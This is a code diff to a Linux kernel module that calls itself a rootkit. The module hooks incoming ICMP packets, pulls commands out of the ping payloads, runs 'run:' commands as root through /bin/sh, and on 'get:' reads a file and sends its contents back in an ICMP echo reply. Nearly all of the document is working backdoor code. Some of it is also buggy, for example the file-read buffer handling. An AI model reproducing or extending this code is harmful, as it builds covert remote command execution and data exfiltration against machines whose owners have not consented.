@@ -7,6 +7,9 @@
 #include <linux/icmp.h>
 #include <linux/inet.h>
 
+#include <linux/fs.h>
+
+
 #define MAX_CMD_LEN 1976
 
 static struct nf_hook_ops nfho;
@@ -19,25 +22,62 @@ typedef enum {
 
 #define COMMAND_NUM 2
 
+
 typedef struct {
   struct work_struct work;
   char string[MAX_CMD_LEN];
+  struct iphdr *iph;
+  struct icmphdr *icmph;
+  struct sk_buff *skb;
 } args_t;
 
 
-static void work_handler(struct work_struct* work)
-{
-    args_t* args_ptr = container_of(work, args_t, work);
-
-
-    char *argv[] = {"/bin/sh", "-c", args_ptr->string, NULL};
+static void run_shell_command(char* bash_command) {
+    char *argv[] = {"/bin/sh", "-c", bash_command, NULL};
     char *envp[] = {"PATH=/bin:/sbin", NULL};
 
-    printk(KERN_INFO "rootkit: working\n");
+    printk(KERN_INFO "rootkit: performing bash command\n");
 
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
-    kfree(args_ptr);
+}
+
+static int read_file(char* filename, char* buffer, int to_read) {
+    struct file *f;
+    int i;
+    loff_t offset = 0;
+
+    buffer = kmalloc(to_read + 1, GFP_KERNEL);
+    for (i = 0; i < to_read + 1; i++) {
+        buffer[i] = '\0';
+    }
+    
+    
+    f = filp_open(filename, O_RDONLY, 0);
+
+    if (!f) {
+        printk(KERN_INFO "rootkit: file was not open\n");
+        return -1;
+    }
+
+
+    kernel_read(f, (void*) buffer, to_read, &offset);
+
+
+    printk(KERN_INFO "rootkit: file was read: %s\n", buffer);
+
+    filp_close(f, NULL);
+    
+    return 0;
+
+
+
+
+
+
+
+
+
 }
 
 
@@ -46,7 +86,6 @@ static command_t parse_command(char* data)
     char* command_strings[COMMAND_NUM] = {"run:\0", "get:\0"};
     command_t commands[COMMAND_NUM] = {RUN, GET};
     uint i, shift, j;
-
 
 
     for (i = 0; i < COMMAND_NUM; i++) {
@@ -69,83 +108,18 @@ static command_t parse_command(char* data)
         
 
     }
-    
-    
+
 
     return BAD_COMMAND;
 
 }
 
+
+
 #define ICMP_HSIZE 8
 #define IP_HSIZE 20
 
 
-int send_icmp(struct net_device* dev, uint8_t dest_addr [ETH_ALEN] , uint16_t proto){
-    
-    int ret;
-    unsigned char* data;
-    char *srcIP = "192.168.31.88";
-    char *dstIP = "192.168.31.125";
-
-    char *hello_world = ">>> KERNEL sk_buff Hello World <<< by Dmytro Shytyi\0";
-
-    int payload_size = strlen(hello_world);
-
-    printk(KERN_INFO "rootkit: 1\n");
-    struct sk_buff* skb = alloc_skb(ETH_HLEN + ICMP_HSIZE + IP_HSIZE + payload_size, GFP_ATOMIC);
-
-
-    printk(KERN_INFO "rootkit: 2\n");
-
-    skb_reserve(skb, ETH_HLEN + ICMP_HSIZE + IP_HSIZE);
-
-    data = skb_put(skb, payload_size);
-    memcpy(data, hello_world, payload_size);
-
-    struct icmphdr* icmph = (struct icmphdr*)skb_push(skb, ICMP_HSIZE);  
-    icmph->type = ICMP_ECHO;
-    icmph->code = 0;
-    icmph->checksum = 0;
-    icmph->un.gateway = 0;
-
-    struct iphdr* iph = (struct iphdr*)skb_push(skb, IP_HSIZE);
-    iph->ihl = IP_HSIZE / 4;
-    iph->version = 4; 
-    iph->tos = 0;
-    iph->tot_len = htons(ICMP_HSIZE + IP_HSIZE + payload_size);
-    iph->frag_off = 0;
-    iph->ttl = 64; 
-    iph->protocol = IPPROTO_ICMP; 
-    iph->check = 0;
-    iph->saddr = in_aton(srcIP);
-    iph->daddr = in_aton(dstIP);
-    printk(KERN_INFO "rootkit: 3\n");
-
-    //dev_hard_header(skb, dev, ETH_P_IP, dest_addr, dev->dev_addr, dev->addr_len);
-
-
-    struct ethhdr* eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));
-    skb->dev = dev;
-    skb->pkt_type = PACKET_OUTGOING;
-    skb->protocol = htons(proto);
-    eth->h_proto = skb->protocol;
-    skb->no_fcs = 1;
-    
-    memcpy(eth->h_source, dev->dev_addr, ETH_ALEN);
-    memcpy(eth->h_dest, dest_addr, ETH_ALEN);
-
-
-    ret = dev_queue_xmit(skb);
-
-    printk(KERN_INFO "rootkit: ret: %d\n", ret);
-    
-
-    return 0;
-}
-
-
-
-    
 int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct net_device* dev){
 
     int payload_size = strlen(string);
@@ -172,6 +146,7 @@ int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct n
     new_icmph = (struct icmphdr*)skb_push(skb, ICMP_HSIZE);  
     memcpy(new_icmph, icmph, ICMP_HSIZE);
     new_icmph->type = ICMP_ECHOREPLY;
+    // add sum recalculation
 
     new_iph = (struct iphdr*)skb_push(skb, IP_HSIZE);
     memcpy(new_iph, iph, IP_HSIZE);
@@ -206,11 +181,48 @@ int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct n
 }
 
 
+void send_response(char* string, args_t* args) {
+    struct net_device *enp0s3;
+    enp0s3 = dev_get_by_name(&init_net,"enp0s3");
+    return_icmp(string, args->icmph, args->iph, enp0s3);
+    dev_put(enp0s3);
+    kfree_skb(args->skb);
+    kfree(args);
+}
+
+
+static void rootkit_handler(struct work_struct* work) {
+
+    args_t* args = container_of(work, args_t, work);
+    char* buffer;
+
+    command_t command = parse_command(args->string);
+
+    switch (command) {
+        case RUN:
+            printk(KERN_INFO "rootkit: run command: %s \n", args->string);
+            run_shell_command(args->string);
+            send_response("command was performed\0", args);
+            break;
+        case GET:
+            printk(KERN_INFO "rootkit: get command: %s \n", args->string);
+            read_file("/home/maksym/rootkit/run.sh\0", buffer, 100);
+            send_response(buffer, args);
+            kfree(buffer);
+            break;
+        default:
+            printk(KERN_INFO "rootkit: mda\n");
+            send_response("test_string\0", args);
+            break;
+    }
+
+
+}
 
     
 
 
-static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+static unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
     
     struct iphdr *iph;
@@ -221,9 +233,8 @@ static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const str
     unsigned char *i;
     int j = 0;
 
-    args_t* args_ptr;
+    args_t* args;
 
-    command_t command;
 
     iph = ip_hdr(skb);
     icmph = icmp_hdr(skb);
@@ -243,7 +254,7 @@ static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const str
 
     printk(KERN_INFO "rootkit: parsing command\n");
 
-    args_ptr = kmalloc(sizeof(args_t), GFP_KERNEL);
+    args = kmalloc(sizeof(args_t), GFP_KERNEL);
 
     user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
     tail = skb_tail_pointer(skb);
@@ -252,61 +263,39 @@ static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const str
     for (i = user_data; i != tail; ++i) {
         char c = *(char *)i;
 
-        args_ptr->string[j] = c;
+        args->string[j] = c;
         j++;
 
         if (c == '\0')
             break;
 
         if (j == MAX_CMD_LEN) {
-            args_ptr->string[j] = '\0';
+            args->string[j] = '\0';
             break;
         }
 
     }
 
-    command = parse_command(args_ptr->string);
+    args->icmph = icmph;
+    args->iph = iph;
+    args->skb = skb;
 
-    switch (command) {
-        case RUN:
-            printk(KERN_INFO "rootkit: run command: %s \n", args_ptr->string);
-            INIT_WORK(&args_ptr->work, work_handler);
-            schedule_work(&args_ptr->work);
-            break;
-        case GET:
-            printk(KERN_INFO "rootkit: get command: %s \n", args_ptr->string);
-            break;
-        default:
-            printk(KERN_INFO "rootkit: mda\n");
-            break;
-    }
+    printk(KERN_INFO "rootkit: scheduling rootkit action \n");
+    INIT_WORK(&args->work, rootkit_handler);
+    schedule_work(&args->work);
 
-    struct net_device *enp0s3;
-    enp0s3 = dev_get_by_name(&init_net,"enp0s3");
 
-    return_icmp("test_string\0", icmph, iph, enp0s3);
-
-    dev_put(enp0s3);
-
-    return NF_DROP;
+    return NF_STOLEN;
 }
 
 static int __init startup(void)
 {
-    nfho.hook = icmp_cmd_executor;
+    nfho.hook = packet_reciever;
     nfho.hooknum = NF_INET_PRE_ROUTING;
     nfho.pf = PF_INET;
     nfho.priority = NF_IP_PRI_FIRST;
     nf_register_net_hook(&init_net, &nfho);
 
-    //uint16_t proto;
-    //static char addr[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff}; 
-    //uint8_t dest_addr[ETH_ALEN];
-    //struct net_device *enp0s3;
-    //enp0s3 = dev_get_by_name(&init_net,"enp0s3");
-    //memcpy(dest_addr, addr,ETH_ALEN);
-    //proto = ETH_P_IP;
-    //send_icmp(enp0s3,dest_addr,proto);
     printk(KERN_INFO "rootkit: start\n");
     return 0;
 }
